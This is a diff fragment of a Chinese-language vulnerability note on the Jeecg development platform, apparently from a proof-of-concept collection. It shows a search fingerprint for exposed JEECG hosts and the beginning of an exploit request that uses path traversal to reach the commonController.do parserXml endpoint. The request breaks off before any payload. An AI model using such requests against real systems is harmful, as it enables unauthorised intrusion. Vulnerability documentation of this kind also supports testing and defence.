@@ -7,7 +7,7 @@ Jeecg  快速开发平台，可以应用在任何J2EE项目的开发中，尤其
 app="JEECG"
 ```
 
-## poc
+## POC
 ```
 POST /api/../commonController.do?parserXml HTTP/1.1
 Host: x.x.x.x
